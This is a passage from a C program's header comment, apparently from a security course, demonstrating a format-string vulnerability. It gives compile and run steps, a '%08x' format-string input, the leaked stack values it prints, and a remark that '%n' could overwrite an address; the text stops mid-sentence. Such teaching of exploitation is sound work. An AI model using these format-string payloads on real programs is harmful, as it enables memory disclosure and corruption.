/*
Ran this program on x86_64 bit ubuntu machine with 14.04 LTS version.
compile this program with 

gcc -w program3.c -o program3

run the program as follows:

./program3 CCCC%08x.%08x.%08x.%08x
correct:
CCCC%08x.%08x.%08x.%08x
Incorrect:
CCCCf7ff5000.f7dd59e0.f7b00870.f7dd59e0
value  @ address :0x00601058 = 10 [0x0000000a]

Here we can see in incorrect way of printf we know a value stored at a particular addresss :
using this info it is possible to overwrite that address with a value of attacker's choosing.

Like with %n modifier,
